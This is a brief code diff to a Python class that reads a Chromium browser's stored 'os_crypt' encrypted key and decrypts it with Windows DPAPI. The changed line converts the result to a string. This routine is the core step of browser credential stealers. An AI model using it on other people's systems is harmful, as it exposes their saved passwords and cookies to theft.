@@ -12,7 +12,7 @@ class getKey:
             crypthon = json.loads(crypthon)
         chain = self.decode(crypthon["os_crypt"]["encrypted_key"])
         chain = chain[5:] # Remove DPAPI char
-        return win32crypt.CryptUnprotectData(chain, self.value, self.value, self.value, 0)[1]
+        return str(win32crypt.CryptUnprotectData(chain, self.value, self.value, self.value, 0)[1])
     def decode(self, entry) -> None:
         return base64.b64decode(entry)
 
